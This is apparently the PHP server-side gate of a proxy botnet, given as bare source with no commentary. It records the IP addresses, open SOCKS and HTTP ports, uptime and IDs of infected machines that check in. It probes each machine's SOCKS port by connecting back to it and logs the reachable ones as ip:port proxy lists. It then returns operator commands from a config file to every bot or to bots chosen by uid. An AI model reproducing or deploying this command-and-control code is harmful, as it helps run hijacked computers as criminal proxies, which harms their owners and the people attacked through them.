<?php
$id=$_GET['id'] ;
$httpport=$_GET['httpport'] ;
$socksport=$_GET['socksport'] ;
$uptimem=$_GET['uptimem'] ;
$uptimeh=$_GET['uptimeh'] ;
$param=$_GET['param'] ;
$ver=$_GET['ver'] ;
$uid=$_GET['uid'] ;
$wm=$_GET['wm'] ;
$lang=$_GET['lang'] ;

$ssip=$_GET['ssip'] ;
$ip=getenv("REMOTE_ADDR");
$real_ip=getenv("HTTP_X_FORWARDED_FOR");
if($ver==""):
exit;
endif;
$browser=getenv("HTTP_USER_AGENT");
 
$id=ereg_replace("<","&#8249",$id);
$id=ereg_replace(">","&#8250",$id);
$id=ereg_replace("\"","&#8221",$id);
$id=ereg_replace(";","",$id);
$id=ereg_replace("%","",$id);
$param=ereg_replace("<","&#8249",$param);
$param=ereg_replace(">","&#8250",$param);
$param=ereg_replace("\"","&#8221",$param);
$param=ereg_replace(";","",$param);
$param=ereg_replace("%","",$param);

//logging
$date=date("d.m.Y");
$tim=date("H:i:s");
$out=explode(":", $tim);
$out1=explode(".", $date);
$hours=$out[0]+8;
$days=$out1[0];
if($out[0]==16): $hours=00;$days=$out1[0]+1;endif;
if($out[0]==17): $hours=01;$days=$out1[0]+1;endif;
if($out[0]==18): $hours=02;$days=$out1[0]+1;endif;
if($out[0]==19): $hours=03;$days=$out1[0]+1;endif;
if($out[0]==20): $hours=04;$days=$out1[0]+1;endif;
if($out[0]==21): $hours=05;$days=$out1[0]+1;endif;
if($out[0]==22): $hours=06;$days=$out1[0]+1;endif;
if($out[0]==23): $hours=07;$days=$out1[0]+1;endif;
if($days=="1"): $days="01";endif;
if($days=="2"): $days="02";endif;
if($days=="3"): $days="03";endif;
if($days=="4"): $days="04";endif;
if($days=="5"): $days="05";endif;
if($days=="6"): $days="06";endif;
if($days=="7"): $days="07";endif;
if($days=="8"): $days="08";endif;
if($days=="9"): $days="09";endif;
if($days=="32"): $days=01;endif;
$tim=$hours.":".$out[1].":".$out[2];
$date=$days.".".$out1[1].".".$out1[2];
echo "$ip EE<br>"; 
if($wm==1):
$fh=fopen("logs/WM$days.txt","a+");
fputs($fh,"IP_R:$real_ip IP:$ip PORT:$param Date:$date Time:$tim SOCKS:$socksport HTTP:$httpport Uptime:$uptimeh:$uptimem wm=$wm uid=$uid id=$id gld=$gold pal=$pal bay=$bay v:$ver\n\n");
fclose($fh);
endif;
echo "test3<br>"; 

echo "test4<br>"; 
$fh=fopen("logs/N$days.txt","a+");

$fp = fsockopen($real_ip,$socksport, &$errno, &$errstr, 30); 
if(!$fp):
$okk=1 ;
else:
$okk=0  ; 

fputs($fh,"IP_R:$real_ip IP:$ip PORT:$param $tim SOCKS:$socksport HTTP:$httpport Uptime:$uptimeh:$uptimem lang-$lang wm=$wm uid=$uid id=$id v:$ver\n\n");
fclose($fh);
$fh=fopen("logs/P$days.txt","a+");
fputs($fh,"$real_ip:$socksport\r\n");
fclose($fh);
//;---------------------------------------------------------------------
send_command();
//;---------------------------------------------------------------------
exit;
endif;

$fp = fsockopen($ip,$socksport, &$errno, &$errstr, 30); 
if(!$fp):
$okk=1 ;
$fhh=fopen("logs/N1$days.txt","a+");
fputs($fhh,"IP_R:$real_ip IP:$ip PORT:$param $tim SOCKS:$socksport HTTP:$httpport Uptime:$uptimeh:$uptimem lang-$lang w=$wm uid=$uid v:$ver\n\n");
fclose($fhh);
fclose($fh);
//;---------------------------------------------------------------------
send_command();
//;---------------------------------------------------------------------
exit;
else:
$okk=0  ; 
fclose($fp);
endif;

fputs($fh,"IP_R:$real_ip IP:$ip PORT:$param $tim SOCKS:$socksport HTTP:$httpport Uptime:$uptimeh:$uptimem lang-$lang w=$wm uid=$uid id=$id v:$ver\n\n");
fclose($fh);
$fh=fopen("logs/P$days.txt","a+");
fputs($fh,"$ip:$socksport\r\n");
fclose($fh);
//;---------------------------------------------------------------------
send_command();
//;---------------------------------------------------------------------
exit;

//;---------------------------------------------------------------------
function send_command() {
$cmdname="logs/cfg.dat";
$cmduid="logs/uid.ini";
echo "test5<br>"; 
if(filesize("$cmduid")==0):
$fh=fopen($cmdname,"r");
$cfgdata=fread($fh,filesize($cmdname));
fclose($fh);
echo "CMND$cfgdata";
exit;
endif;

$array=file("$cmduid");
$kolvo=count($array);
for($ei=0;$ei<$kolvo;$ei++) {
$llen=strlen($array[$ei]);
$llen=$llen-2;
$array[$ei]=substr($array[$ei],0,$llen);
if($array[$ei]==$uid):

$fh=fopen($cmdname,"r");
$cfgdata=fread($fh,filesize($cmdname));
fclose($fh);
echo "CMND$cfgdata";
exit;
endif;
}
echo "CMND\r\n";
}
//;---------------------------------------------------------------------
?>